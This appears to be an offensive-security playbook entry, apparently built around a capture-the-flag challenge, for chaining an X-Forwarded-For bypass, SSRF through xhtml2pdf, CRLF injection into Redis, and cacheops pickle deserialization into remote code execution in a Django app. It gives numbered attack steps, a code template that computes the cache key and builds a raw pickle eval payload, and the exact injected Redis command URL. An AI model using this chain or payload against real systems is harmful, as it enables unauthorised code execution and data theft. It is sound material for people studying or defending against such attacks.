---
name: ssrf_crlf_redis_cacheops_pickle_rce
vuln_type: deserialization
sub_technique: ssrf_crlf_redis_pickle
category: exploitation
safety_level: destructive
tags:
- x-forwarded-for
- ssrf
- xhtml2pdf
- crlf
- redis
- cacheops
- pickle
- rce
- django
---

# X-Forwarded-For Bypass + Xhtml2Pdf Ssrf + Crlf Redis Inline Protocol → Cacheops Pickle.Loads() Rce

## When to Apply

A Django app trusts X-Forwarded-For for IP checks (internal-only endpoints). User-controlled signpath is rendered as `<img src>` in PDF via xhtml2pdf, creating an SSRF primitive. Setting signpath to `http://redis:6379/\r\n...` injects Redis inline commands via CRLF. cacheops stores ORM query results in Redis DB 1 as pickle, and cache reads trigger pickle.loads() → RCE.

## Prerequisites

- X-Forwarded-For trusted by get_client_ip() (no proxy validation)
- signpath stored without URL validation (broken validate() method)
- xhtml2pdf fetches <img src> during PDF rendering (SSRF)
- Internal Redis reachable from app container
- cacheops enabled with pickle serialization on sign_service models
- Attacker can compute cacheops cache key (q:<md5> from query + model + fields)

## Steps

1. Sign up attacker account.
2. Find own uid by brute-scanning /document/1/render_internal/{uid} with X-Forwarded-For: 127.0.0.1.
3. Compute cacheops cache key for `<UserModel>.objects.get(pk=uid)`: md5 of (QuerySet class + model path + field stamp + SQL + ModelIterable class).
4. Build pickle payload: `builtins.eval("Document.objects.create(..., contents=open('/flag').read())")`.
5. Set signpath to: `http://redis:6379/\r\nSELECT 1\r\nSET q:{key} "{escaped_pickle}"\r\nPING`
6. POST /document/1 (sign) → xhtml2pdf fetches signpath → CRLF → Redis SET.
7. GET /document/1/render_internal/{uid} with XFF → cache read → pickle.loads() → RCE.
8. Login as second account, find 'owned' document, read flag from textarea.

## Code Template

```
# Cache key computation
md5 = hashlib.md5()
for part in ('django.db.models.query.QuerySet', '<app>.models.<UserModel>',
             field_stamp, sql, 'django.db.models.query.ModelIterable'):
    md5.update(part.encode())
key = 'q:' + md5.hexdigest()
# Pickle payload (no class needed)
pickle_bytes = b'cbuiltins\neval\n(S' + repr(expr).encode() + b'\ntR.'
sign_url = f'http://redis:6379/\r\nSELECT 1\r\nSET {key} "{escape(pickle_bytes)}"\r\nPING'
```

## Examples

### Example 1

- **broken_validation**: SignForm.validate() reads self.cleaned_data.get('') (wrong key)
- **crlf_terminator**: \r\nPING absorbs trailing HTTP/1.1 header junk
- **two_accounts**: Attacker account (cache poison) + reader account (flag retrieval)

Attacker session breaks after pickle.loads() corrupts the cached User object. A second account is essential for stable flag retrieval. The PING at the end of the Redis command sequence absorbs the `HTTP/1.1` suffix that xhtml2pdf appends.
